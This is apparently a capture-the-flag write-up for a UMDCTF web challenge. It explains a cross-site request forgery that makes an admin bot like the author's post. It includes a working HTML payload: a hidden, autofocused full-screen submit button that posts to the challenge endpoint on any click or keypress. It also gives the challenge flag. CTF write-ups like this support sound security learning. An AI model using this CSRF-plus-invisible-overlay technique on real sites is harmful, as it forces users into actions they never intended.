# Solution
CSRF to make the admin like our created post

1) Create account
2) Login
3) Create a post with a form that have an autofocused submit button
4) when the admin loads the page, any click or keypress automatically submits the form

```html
<form action="https://a-minecraft-movie-api.challs.umdctf.io/legacy-social" method="POST">
  <input name="sessionNumber" value="23">
  <input name="postId" value="e7181b50-1d30-4c07-ba37-4350383322e3">
  <input name="likes" value="1">
  <input type="submit" autofocus style="position:fixed;top:0;left:0;width:100%;height:100%;opacity:0">
</form>
```

`UMDCTF{I_y3@RNeD_f0R_7HE_Min3S}`

Solved by: aan03
